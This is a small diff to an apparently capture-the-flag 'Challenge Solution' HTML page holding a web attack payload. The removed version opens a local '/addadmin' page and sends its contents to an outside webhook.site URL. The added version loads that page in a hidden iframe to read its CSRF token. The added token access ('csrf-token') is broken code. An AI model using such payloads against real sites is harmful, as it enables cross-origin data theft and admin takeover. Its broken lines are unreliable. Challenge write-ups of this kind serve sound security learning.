@@ -5,13 +5,10 @@
     Challenge Solution HTML
 </body>
 <script>
-    let w = window.open('http://localhost:8000/addadmin');
-
-
-    setTimeout(() => {
-        let content = w.document.body.innerHTML
-        window.location = 'https://webhook.site/0090b671-0c20-4d09-8c75-83e5fd16f4e4/?' + encodeURI(content)
-    }, 250)
+    document.writeln('<iframe id="iframe" src="/addadmin" width="0" height="0" onload="read()"></iframe>');
+    function read() {
+        alert(document.getElementById("iframe").contentDocument.forms[0].csrf-token.value);
+    }
 </script>
 
 </html>
